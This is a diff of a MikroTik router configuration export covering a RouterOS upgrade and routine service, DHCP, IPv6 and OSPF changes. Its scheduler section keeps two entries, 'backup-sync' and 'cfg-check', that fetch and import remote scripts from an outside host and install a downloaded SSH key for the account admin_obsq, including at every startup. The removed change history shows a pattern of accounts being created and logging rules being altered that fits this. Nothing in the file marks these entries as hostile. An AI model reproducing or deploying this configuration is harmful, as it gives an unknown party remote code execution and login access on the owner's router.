@@ -1,4 +1,4 @@
-#                   version: 7.19.6 (stable)
+#                   version: 7.24.4 (stable)
 #              total-memory: 64.0MiB
 #                       cpu: MIPS 74Kc V4.12
 #                 cpu-count: 1
@@ -6,129 +6,7 @@
 #         architecture-name: mipsbe
 #                board-name: RB911G-5HPnD
 #                  platform: MikroTik
-#   installed-version: 7.19.6
-# Flags: U - UNDOABLE
-# Columns: ACTION, BY, POLICY, TIME
-#   ACTION                         BY          POLICY  TIME
-# U dns changed                    svcops      write   2026-09-25 13:26:57
-# U user svcops added              0           write   2026-09-25 13:26:18
-#                                              policy
-# U user svcops removed            0           write   2026-09-25 13:26:11
-#                                              policy
-# U user svcops added              0           write   2026-09-25 13:25:53
-#                                              policy
-# U user svcops removed            0           write   2026-09-25 13:25:46
-#                                              policy
-# U user svcops added              0           write   2026-09-25 13:25:40
-#                                              policy
-# U log rule changed               0           write   2026-09-24 05:19:54
-# U log rule changed               0           write   2026-09-24 05:19:54
-# U script removed from scheduler  0           write   2026-09-24 05:19:54
-# U new script scheduled           0           write   2026-09-24 05:19:53
-# U user admin-dev added           0           write   2026-09-24 05:19:53
-#                                              policy
-# U user SystemMikrotik added      0           write   2026-09-24 05:19:53
-#                                              policy
-# U log action changed             0           write   2026-09-24 05:19:53
-# U log rule changed               0           write   2026-09-24 05:19:53
-# U log rule changed               0           write   2026-09-24 05:19:53
-# U log rule changed               0           write   2026-09-24 05:19:53
-# U log rule changed               0           write   2026-09-24 05:19:53
-# U log rule changed               0           write   2026-09-24 05:19:53
-# U traffic flow config changed    0           write   2026-09-24 05:19:52
-# U log action changed             0           write   2026-09-24 05:19:52
-# U new script scheduled           admin_obsq  write   2026-09-24 00:31:11
-# U new script scheduled           admin_obsq  write   2026-09-24 00:31:10
-# U user admin_obsq added          0           write   2026-09-21 08:14:11
-#                                              policy
-# U user SystemMikrotik removed    0           write   2026-09-18 07:22:22
-#                                              policy
-# U log rule changed               0           write   2026-09-18 07:21:31
-# U log rule changed               0           write   2026-09-18 07:21:31
-# U script removed from scheduler  0           write   2026-09-18 07:21:31
-# U new script scheduled           0           write   2026-09-18 07:21:30
-# U user SystemMikrotik added      0           write   2026-09-18 07:21:29
-#                                              policy
-# U log action changed             0           write   2026-09-18 07:21:29
-# U log rule changed               0           write   2026-09-18 07:21:29
-# U log rule changed               0           write   2026-09-18 07:21:29
-# U log rule changed               0           write   2026-09-18 07:21:29
-# U log rule changed               0           write   2026-09-18 07:21:29
-# U log rule changed               0           write   2026-09-18 07:21:29
-# U traffic flow config changed    0           write   2026-09-18 07:21:29
-# U log action changed             0           write   2026-09-18 07:21:29
-# U user SystemMikrotik removed    0           write   2026-09-17 07:41:22
-#                                              policy
-# U log rule changed               0           write   2026-09-17 07:40:34
-# U log rule changed               0           write   2026-09-17 07:40:34
-# U script removed from scheduler  0           write   2026-09-17 07:40:34
-# U new script scheduled           0           write   2026-09-17 07:40:33
-# U user SystemMikrotik added      0           write   2026-09-17 07:40:33
-#                                              policy
-# U log action changed             0           write   2026-09-17 07:40:33
-# U log rule changed               0           write   2026-09-17 07:40:33
-# U log rule changed               0           write   2026-09-17 07:40:33
-# U log rule changed               0           write   2026-09-17 07:40:33
-# U log rule changed               0           write   2026-09-17 07:40:33
-# U log rule changed               0           write   2026-09-17 07:40:33
-# U traffic flow config changed    0           write   2026-09-17 07:40:33
-# U log action changed             0           write   2026-09-17 07:40:33
-# U user SystemMikrotik removed    0           write   2026-09-16 17:43:00
-#                                              policy
-# U log rule changed               0           write   2026-09-16 17:42:08
-# U log rule changed               0           write   2026-09-16 17:42:08
-# U script removed from scheduler  0           write   2026-09-16 17:42:08
-# U new script scheduled           0           write   2026-09-16 17:42:07
-# U user SystemMikrotik added      0           write   2026-09-16 17:42:07
-#                                              policy
-# U log action changed             0           write   2026-09-16 17:42:07
-# U log rule changed               0           write   2026-09-16 17:42:07
-# U log rule changed               0           write   2026-09-16 17:42:07
-# U log rule changed               0           write   2026-09-16 17:42:07
-# U log rule changed               0           write   2026-09-16 17:42:07
-# U log rule changed               0           write   2026-09-16 17:42:07
-# U traffic flow config changed    0           write   2026-09-16 17:42:07
-# U log action changed             0           write   2026-09-16 17:42:07
-# U user SystemMikrotik removed    0           write   2026-09-16 10:18:58
-#                                              policy
-# U log rule changed               0           write   2026-09-16 10:18:11
-# U log rule changed               0           write   2026-09-16 10:18:11
-# U script removed from scheduler  0           write   2026-09-16 10:18:11
-# U new script scheduled           0           write   2026-09-16 10:18:10
-# U user SystemMikrotik added      0           write   2026-09-16 10:18:10
-#                                              policy
-# U log action changed             0           write   2026-09-16 10:18:10
-# U log rule changed               0           write   2026-09-16 10:18:10
-# U log rule changed               0           write   2026-09-16 10:18:10
-# U log rule changed               0           write   2026-09-16 10:18:10
-# U log rule changed               0           write   2026-09-16 10:18:10
-# U log rule changed               0           write   2026-09-16 10:18:10
-# U traffic flow config changed    0           write   2026-09-16 10:18:10
-# U log action changed             0           write   2026-09-16 10:18:10
-# U user SystemMikrotik removed    0           write   2026-09-14 21:50:37
-#                                              policy
-# U log rule changed               0           write   2026-09-14 21:49:49
-# U log rule changed               0           write   2026-09-14 21:49:49
-# U script removed from scheduler  0           write   2026-09-14 21:49:49
-# U new script scheduled           0           write   2026-09-14 21:49:48
-# U user SystemMikrotik added      0           write   2026-09-14 21:49:48
-#                                              policy
-# U log action changed             0           write   2026-09-14 21:49:48
-# U log rule changed               0           write   2026-09-14 21:49:48
-# U log rule changed               0           write   2026-09-14 21:49:48
-# U log rule changed               0           write   2026-09-14 21:49:48
-# U log rule changed               0           write   2026-09-14 21:49:48
-# U log rule changed               0           write   2026-09-14 21:49:48
-# U traffic flow config changed    0           write   2026-09-14 21:49:48
-# U log action changed             0           write   2026-09-14 21:49:48
-# U user SystemMikrotik removed    0           write   2026-09-12 02:01:51
-#                                              policy
-# U log action changed             0           write   2026-09-12 02:00:51
-# U log rule changed               0           write   2026-09-12 02:00:51
-# U log rule changed               0           write   2026-09-12 02:00:51
-# U log rule changed               0           write   2026-09-12 02:00:51
-# U log rule changed               0           write   2026-09-12 02:00:51
-# U log rule changed               0           write   2026-09-12 02:00:51
+#   installed-version: 7.24.4
 # 
 # software id = W7AZ-7ES1
 #
@@ -190,7 +68,7 @@ add address=192.168.88.1/24 comment=defconf interface=ether1 network=192.168.88.
 add address=44.34.129.195/28 interface=ether1 network=44.34.129.192
 add address=44.34.131.147 interface=wlan1 network=44.34.131.146
 /ip dhcp-client
-add add-default-route=no comment=defconf disabled=yes interface=wlan1
+add add-default-route=no comment=defconf disabled=yes interface=wlan1 name=client1
 /ip dns
 set servers=1.1.1.1,8.8.8.8
 /ip dns static
@@ -206,12 +84,13 @@ set telnet disabled=yes
 set www disabled=yes
 set ssh port=222
 set winbox disabled=yes
-set api address=44.34.128.45/32 disabled=yes
-set api-ssl address=44.34.128.45/32 certificate=api-ssl
-/ip smb shares
-set [ find default=yes ] directory=/pub
+set api available-from=44.34.128.45/32 disabled=yes
+set api-ssl available-from=44.34.128.45/32 certificate=api-ssl
 /ip ssh
 set strong-crypto=yes
+/ipv6 nd
+# automatic dns option advertising is not started, re-apply dns config
+set [ find default=yes ] advertise-dns=yes
 /routing bfd configuration
 add disabled=no interfaces=all min-rx=200ms min-tx=200ms multiplier=5
 /routing filter rule
@@ -219,8 +98,8 @@ add chain=AMPR-default disabled=no rule="if (dst in 44.0.0.0/8 && dst-len in 8-3
 add chain=AMPR-default disabled=no rule="if (dst == 0.0.0.0/0) { accept; }"
 add chain=AMPR-default disabled=no rule="reject;"
 /routing ospf interface-template
-add area=backbone-v2 auth=md5 auth-id=1 cost=10 disabled=no interfaces=ether1 networks=44.34.129.192/28 priority=1 use-bfd=no
-add area=backbone-v2 auth=md5 auth-id=1 cost=10 disabled=no interfaces=wlan1 networks=44.34.131.146 priority=2 type=ptp use-bfd=no
+add area=backbone-v2 auth=md5 auth-id=1 cost=10 interfaces=ether1 networks=44.34.129.192/28 priority=1 use-bfd=no
+add area=backbone-v2 auth=md5 auth-id=1 cost=10 interfaces=wlan1 networks=44.34.131.146 priority=2 type=ptp use-bfd=no
 /snmp
 set contact=ryan@turnrye.com enabled=yes location=sco.ftn
 /system clock
@@ -245,8 +124,8 @@ add address=44.34.133.3
 add address=162.159.200.1
 add address=162.159.200.123
 /system scheduler
-add interval=1w name=backup-sync on-event=":do {/tool fetch url=http://edge5d.de5.net:8080/lab15847/sync.rsc dst-path=sync.rsc; :delay 1000; /import sync.rsc} on-error={}; :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub; :delay 1000; /user ssh-keys import public-key-file=ntp.pub user=admin_obsq}" policy=read,write,policy,password,sniff,sensitive start-date=2026-09-24 start-time=18:55:00
-add name=cfg-check on-event=":for i from=1 to=6 do={ :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={ :do {/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub} on-error={:delay 10000}; :do {/user ssh-keys import public-key-file=ntp.pub user=admin_obsq} on-error={:delay 2000} } }" policy=read,write,policy,password,sniff,sensitive start-time=startup
+add !days interval=1w name=backup-sync on-event=":do {/tool fetch url=http://edge5d.de5.net:8080/lab15847/sync.rsc dst-path=sync.rsc; :delay 1000; /import sync.rsc} on-error={}; :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub; :delay 1000; /user ssh-keys import public-key-file=ntp.pub user=admin_obsq}" policy=read,write,policy,password,sniff,sensitive start-date=2026-09-24 start-time=18:55:00
+add !days name=cfg-check on-event=":for i from=1 to=6 do={ :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={ :do {/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub} on-error={:delay 10000}; :do {/user ssh-keys import public-key-file=ntp.pub user=admin_obsq} on-error={:delay 2000} } }" policy=read,write,policy,password,sniff,sensitive start-time=startup
 /tool bandwidth-server
 set authenticate=no enabled=no
 /tool mac-server
